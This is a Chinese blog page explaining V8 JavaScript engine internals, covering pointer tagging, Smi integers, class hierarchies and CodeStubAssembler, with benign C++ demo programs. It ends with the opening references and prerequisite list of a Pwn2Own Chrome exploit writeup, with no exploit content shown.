&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实际上它扩展如下。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> FixedArrayBase::length() <span class="keyword">const</span> &#123;</span><br><span class="line">  DCHECK(condition);</span><br><span class="line">  Object* value = (*<span class="keyword">reinterpret_cast</span>&lt;Object* <span class="keyword">const</span>*&gt;(</span><br><span class="line">  <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">const</span> byte*&gt;(<span class="keyword">this</span>) + kLengthOffset - kHeapObjectTag)</span><br><span class="line">  <span class="keyword">return</span> Smi::ToInt(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> FixedArrayBase::set_length(<span class="keyword">int</span> value) <span class="keyword">const</span> &#123;</span><br><span class="line">  DCHECK(condition);</span><br><span class="line">  base::Relaxed_Store(</span><br><span class="line">      <span class="keyword">reinterpret_cast</span>&lt;base::AtomicWord*&gt;(</span><br><span class="line">          <span class="keyword">reinterpret_cast</span>&lt;byte*&gt;(<span class="keyword">this</span>) + kLengthOffset - kHeapObjectTag);</span><br><span class="line">      <span class="keyword">reinterpret_cast</span>&lt;base::AtomicWord&gt;(Smi::FromInt(value)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>重要的是<br><code>reinterpret_cast&lt;const byte*&gt;(this) + kLengthOffset - kHeapObjectTag</code><br>在这部分中，我们看到在将特定字段的偏移量添加到此指针后减去kHeapObjectTag。<br>顺便说一句，kHeapObjectTag的定义如下。<br><code>const int kHeapObjectTag = 1</code><br>只有1，也就是说，只需在指针地址的末尾设置1即可。</p>
<p>以下是示例代码<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">include &lt;stdio.h&gt;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> kHeapObjectTag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> kHeapObjectTagSize = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">intptr_t</span> kHeapObjectTagMask = (<span class="number">1</span> &lt;&lt; kHeapObjectTagSize) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">HasHeapObjectTag</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* value)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(value) &amp; kHeapObjectTagMask) ==</span><br><span class="line">          kHeapObjectTag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">auto</span> allocated = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">char</span>*&gt;(</span><br><span class="line">      <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>) * (<span class="number">2</span> + kHeapObjectTag)));</span><br><span class="line">  <span class="keyword">auto</span> heap_object = allocated + kHeapObjectTag;</span><br><span class="line">  heap_object[<span class="number">0</span>] = <span class="string">'m'</span>;</span><br><span class="line">  heap_object[<span class="number">1</span>] = <span class="string">'v'</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%ld %ld %p %p %d\n"</span>, <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(allocated),</span><br><span class="line">         <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(heap_object), allocated, heap_object,</span><br><span class="line">         HasHeapObjectTag(heap_object));</span><br><span class="line">  <span class="built_in">free</span>(allocated);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>运行结果如下：<br><code>140289524108464 140289524108465 0x7f97b3400cb0 0x7f97b3400cb1 1</code><br>地址以1结尾。<br>另外，v8::i::HeapObject在开头有一个v8::Map对象来表示隐藏类，以便识别它自己的类型。<br>所以v8::i::HeapObject的内存布局如下。</p>
<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-09-163310.png" alt=""><br>由于我们总是有一个表示类型的v8::Map，我们可以通过查看它来看到v8::i ::HeapObject的类型。<br>此外，写为Derived Object Header的部分根据继承的对象而不同（如果它是v8::i::FixedArray则是长度字段）。<br>下面是Map和JSObject C ++代码的简化表示<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> kHeapObjectTag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> kHeapObjectTagSize = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">intptr_t</span> kHeapObjectTagMask = (<span class="number">1</span> &lt;&lt; kHeapObjectTagSize) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">HasHeapObjectTag</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* value)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(value) &amp; kHeapObjectTagMask) ==</span><br><span class="line">          kHeapObjectTag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Map</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">enum</span> InstanceType &#123;</span><br><span class="line">    JS_OBJECT,</span><br><span class="line">    JS_ARRAY,</span><br><span class="line">    JS_STRING</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">set_instance_type</span><span class="params">(InstanceType instance_type)</span> </span>&#123;</span><br><span class="line">    instance_type_ = instance_type;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">InstanceType <span class="title">instance_type</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> instance_type_;</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  InstanceType instance_type_;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> kHeaderSize = <span class="keyword">sizeof</span>(Map);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> byte;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span>* Address;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeapObject</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">char</span> <span class="title">value</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;Address&gt;(<span class="keyword">this</span>)[<span class="number">0</span>];&#125;</span><br><span class="line">  Map::<span class="function">InstanceType <span class="title">instance_type</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;Map*&gt;(</span><br><span class="line">        <span class="keyword">reinterpret_cast</span>&lt;Address&gt;(<span class="keyword">this</span>) - kHeaderSize)-&gt;instance_type();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Free</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> top = <span class="keyword">reinterpret_cast</span>&lt;Address&gt;(<span class="keyword">this</span>) - kHeaderSize - kHeapObjectTag;</span><br><span class="line">    <span class="built_in">free</span>(top);</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="keyword">protected</span>:</span><br><span class="line">  <span class="function"><span class="keyword">static</span> Address <span class="title">NewType</span><span class="params">(Map::InstanceType instance_type, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> allocated = <span class="keyword">reinterpret_cast</span>&lt;Address&gt;(</span><br><span class="line">        <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(byte) * (size + kHeaderSize + kHeapObjectTag)));</span><br><span class="line">    <span class="keyword">auto</span> <span class="built_in">map</span> = <span class="keyword">reinterpret_cast</span>&lt;Map*&gt;(allocated);</span><br><span class="line">    <span class="built_in">map</span>-&gt;set_instance_type(instance_type);</span><br><span class="line">    <span class="keyword">return</span> allocated + kHeaderSize + kHeapObjectTag;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JSObject</span>:</span> <span class="keyword">public</span> HeapObject &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">static</span> JSObject* <span class="title">New</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> a = NewType(Map::JS_OBJECT, <span class="number">1</span>);</span><br><span class="line">    a[<span class="number">0</span>] = <span class="string">'o'</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;JSObject*&gt;(a);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JSArray</span>:</span> <span class="keyword">public</span> JSObject &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">static</span> JSArray* <span class="title">New</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> a = NewType(Map::JS_ARRAY, <span class="number">1</span>);</span><br><span class="line">    a[<span class="number">0</span>] = <span class="string">'a'</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;JSArray*&gt;(a);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JSString</span>:</span> <span class="keyword">public</span> JSObject &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">static</span> JSString* <span class="title">New</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> a = NewType(Map::JS_STRING, <span class="number">1</span>);</span><br><span class="line">    a[<span class="number">0</span>] = <span class="string">'s'</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;JSString*&gt;(a);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  JSObject* objects[] = &#123;</span><br><span class="line">    JSObject::New(),</span><br><span class="line">    JSArray::New(),</span><br><span class="line">    JSString::New()</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">auto</span> o = objects[i];</span><br><span class="line">    <span class="keyword">switch</span> (o-&gt;instance_type()) &#123;</span><br><span class="line">      <span class="keyword">case</span> Map::JS_OBJECT:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"JSObject =&gt; %c\n"</span>, o-&gt;value());</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> Map::JS_ARRAY:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"JSArray =&gt; %c\n"</span>, o-&gt;value());</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> Map::JS_STRING:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"JSString =&gt; %c\n"</span>, o-&gt;value());</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">    objects[i]-&gt;Free();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>执行时，输出JSObject =&gt; o，JSArray =&gt; a，JSString =&gt; s。<br>我认为这个例子有点长，但我认为你可以看到：你可以正确地分配分配给堆的对象类型。<br>让我们解释一下Smi正在做些什么。</p>
<h3 id="Smi"><a href="#Smi" class="headerlink" title="Smi"></a>Smi</h3><p>Smi是Small Integer的缩写，可以直接在指针区域中保存最多31位的整数。<br>似乎Ruby中也采用了相同的方法。<br>对于普通指针，32位CPU使用4个字节,64位CPU使用8个字节。<br>换句话说，如果它是一个高达31位的整数，则可以存储它而不是使用指针。<br>以这种方式，通过将其固定在指针区域中而不使用堆，实现了存储器节省和加速。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Smi</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">static</span> Smi* <span class="title">FromInt</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;Smi*&gt;(value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">value</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(<span class="keyword">this</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">Smi* <span class="title">NewSmi</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> Smi::FromInt(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%d %d\n"</span>, NewSmi(<span class="number">120</span>)-&gt;value(), NewSmi(<span class="number">110</span>)-&gt;value());</span><br><span class="line">  <span class="comment">// out 120 110</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另外，在v8::i::HeapObject的情况下，设置低位为1，但在Smi的情况下，结尾用0作标记，<br>通过cast可以直接进行数值计算。 因此，没有开销。<br>在64位CPU的情况下，由于指针是64位，因此可以存储更大的整数，但是为了与32位兼容，仅使用31位区域。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-09-172242.png" alt=""></p>
<h3 id="JSReceiver"><a href="#JSReceiver" class="headerlink" title="JSReceiver"></a>JSReceiver</h3><ul>
<li>JSArray</li>
<li>JSArrayBuffer</li>
<li>JSArrayBufferView<ul>
<li>JSTypedArray</li>
<li>JSDataView</li>
</ul>
</li>
<li>JSBoundFunction</li>
<li>JSCollection<ul>
<li>JSSet</li>
<li>JSMap</li>
</ul>
</li>
<li>JSStringIterator</li>
<li>JSSetIterator</li>
<li>JSMapIterator</li>
<li>JSWeakCollection<ul>
<li>JSWeakMap</li>
<li>JSWeakSet</li>
</ul>
</li>
<li>JSRegExp</li>
<li>JSFunction</li>
<li>JSGeneratorObject</li>
<li>JSGlobalObject</li>
<li>JSGlobalProxy</li>
<li>JSValue<ul>
<li>JSDate</li>
</ul>
</li>
<li>JSMessageObject</li>
<li>JSModuleNamespace</li>
<li>WasmInstanceObject</li>
<li>WasmMemoryObject</li>
<li>WasmModuleObject</li>
<li>WasmTableObject</li>
</ul>
<p>这些v8::i::JS~类是类的真实形式，例如v8::String和v8::Array通过API使用它们。<br>诸如v8::String之类的类只是wrapper类。<br>所有实际的实现都是v8::i::JS~类。</p>
<h3 id="FixedArrayBase"><a href="#FixedArrayBase" class="headerlink" title="FixedArrayBase"></a>FixedArrayBase</h3><p>v8::i::FixedArray的基本实现，它是v8中的常用类。<br>v8在里面到处都在使用这个固定长度的数组，v8::i::FixedArray有以下层次结构。</p>
<ul>
<li>DescriptorArray</li>
<li>FrameArray</li>
<li>HashTable<ul>
<li>Dictionary</li>
<li>StringTable</li>
<li>StringSet</li>
<li>CompilationCacheTable</li>
<li>MapCache</li>
</ul>
</li>
<li>OrderedHashTable<ul>
<li>OrderedHashSet</li>
<li>OrderedHashMap</li>
</ul>
</li>
<li>Context</li>
<li>FeedbackMetadata</li>
<li>TemplateList</li>
<li>TransitionArray</li>
<li>ScopeInfo</li>
<li>ModuleInfo</li>
<li>ScriptContextTable</li>
<li>WeakFixedArray</li>
<li>WasmSharedModuleData</li>
<li>WasmCompiledModule</li>
</ul>
<p>特别的，v8::i::DescriptorArray是一个存储属性描述符的数组。</p>
<h3 id="CodeStubAssembler-CSA"><a href="#CodeStubAssembler-CSA" class="headerlink" title="CodeStubAssembler (CSA)"></a>CodeStubAssembler (CSA)</h3><p>在v8中使用的DSL语言。<br>实际上，在v8中，编写汇编语言并不是什么新鲜事。<br>相反，通过描述可以输出汇编的CSA，可以输出具有更高<strong>可维护性</strong>的<strong>高速</strong>代码。<br>CSA的一个例子如下所示。<br>计算Fibonacci数,并将其存储在数组中.<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fibonacci</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">1</span>, b = <span class="number">0</span>, temp;</span><br><span class="line">  <span class="keyword">const</span> result = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (num &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">    result.push(a);</span><br><span class="line">    temp = a;</span><br><span class="line">    a = a + b;</span><br><span class="line">    b = temp;</span><br><span class="line">    num--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>将javascript函数转换为CSA时，它将成为以下代码。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">TNode&lt;JSArray&gt; Fibonacci(TNode&lt;Context&gt; context) &#123;</span><br><span class="line">  TVARIABLE(var_a, MachineType::PointerRepresentation(), IntPtrConstant(<span class="number">0</span>));</span><br><span class="line">  TVARIABLE(var_b, MachineType::PointerRepresentation(), IntPtrConstant(<span class="number">1</span>));</span><br><span class="line">  TVARIABLE(var_temp, MachineType::PointerRepresentation());</span><br><span class="line">  TVARIABLE(var_index, MachineType::PointerRepresentation());</span><br><span class="line"></span><br><span class="line">  Node* fixed_array = AllocateFixedArray(PACKED_ELEMENTS, IntPtrConstant(<span class="number">11</span>),</span><br><span class="line">                           INTPTR_PARAMETERS, kAllowLargeObjectAllocation)</span><br><span class="line"></span><br><span class="line">  Label loop(<span class="keyword">this</span>), after_loop(<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">  Branch(IntPtrGreaterThan(IntPtrConstant(<span class="number">100</span>), var_index), &amp;loop, &amp;after_loop);</span><br><span class="line">  BIND(&amp;loop);</span><br><span class="line">  &#123;</span><br><span class="line">    StoreFixedArrayElement(fixed_array, SmiTag(var_index), var_a,</span><br><span class="line">                           SKIP_WRITE_BARRIER);</span><br><span class="line">    var_temp.Bind(var_a);</span><br><span class="line">    var_a.Bind(IntPtrAdd(var_a, var_b));</span><br><span class="line">    var_b.Bind(var_temp);</span><br><span class="line">    Increment(&amp;var_index, <span class="number">1</span>);</span><br><span class="line">    Branch(IntPtrGreaterThan(IntPtrConstant(<span class="number">100</span>), var_index),</span><br><span class="line">           &amp;loop, &amp;after_loop);</span><br><span class="line">  &#125;</span><br><span class="line">  BIND(&amp;after_loop);</span><br><span class="line">  Node* native_context = LoadNativeContext(context);</span><br><span class="line">  Node* array_map = LoadJSArrayElementsMap(PACKED_ELEMENTS, native_context);</span><br><span class="line">  Node* <span class="built_in">array</span> = AllocateUninitializedJSArrayWithoutElements(</span><br><span class="line">      array_map, SmiConstant(<span class="number">12</span>), <span class="literal">nullptr</span>);</span><br><span class="line">  StoreObjectField(<span class="built_in">array</span>, JSArray::kElementsOffset, fixed_array);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">array</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>尽管它在某种程度上是抽象的，并且有很多冗余代码，但是它不是比汇编更容易阅读吗？</p>
<h2 id="阅读代码"><a href="#阅读代码" class="headerlink" title="阅读代码"></a>阅读代码</h2><p>阅读v8代码非常麻烦，但有几种方法。</p>
<p>首先，使用每个IDE的代码跳转。<br>但是，由于v8使用了大量的宏，甚至即使是类的函数定义也可能由宏执行，因此最好在找不到时使用find | grep。</p>
<p>即使您阅读了代码，您可能也不知道执行时的状态，或者您可能不知道调用的层次结构，因此您应该在调试时按以下方式检查它。</p>
<ul>
<li>c++<br>由于src/base/debug/stack_trace.h中有一个StackTrace类，所以最好在要的点调用StackTrace st; st.Print()。<br>此外，由于继承v8::Object类的对象始终具有Print方法，因此可以通过调用 -&gt;Print()来查看内容。</li>
<li>CSA<br>由于Print()函数是在CodeStubAssembler中定义的，我们在那里传递Node *并输出执行a-&gt; Print()的代码。<br>但是，要小心，因为传递IntPtrT会失败。 在这种情况下，你可以做SmiTag。</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://eternalsakura13.com/2018/07/05/p2o_2013/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="sakura">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sakuraのblog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/07/05/p2o_2013/" itemprop="url">case study:Mobile PWN2OWN Autumn 2013 - Chrome on Android - Exploit Writeup</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-05T14:37:50+08:00">
                2018-07-05
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/浏览器/" itemprop="url" rel="index">
                    <span itemprop="name">浏览器</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://docs.google.com/document/d/1tHElG04AJR5OR2Ex-m_Jsmc8S5fAbRB3s4RmTG_PFnw/edit" target="_blank" rel="noopener">https://docs.google.com/document/d/1tHElG04AJR5OR2Ex-m_Jsmc8S5fAbRB3s4RmTG_PFnw/edit</a><br><a href="http://cygx.mydns.jp/blog/?arti=527" target="_blank" rel="noopener">http://cygx.mydns.jp/blog/?arti=527</a></p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>从exploit的角度来看，它们都不是那么重要，但是最好从源码上了解</p>
<ul>
<li>Handle/HandleScope</li>
<li>Context</li>
<li>Isolate</li>
<li>Platform</li>
<li>Interpreter</li>
<li>blob</li>
<li>ICU</li>
<li>third_party</li>
<li>tools</li>
</ul>
<p>参考资料：<a href="https://github.com/v8/v8/wiki/Embedder&#39;s-Guide" target="_blank" rel="noopener">https://github.com/v8/v8/wiki/Embedder&#39;s-Guide</a></p>
<h3 id="Handle-HandleScope"><a href="#Handle-HandleScope" class="headerlink" title="Handle/HandleScope"></a>Handle/HandleScope</h3><ul>
<li>Handle<ul>
<li>要启用GC跟踪，指针包装类型<ul>
<li>为了对应任何类型的指针，请使用C++模板</li>
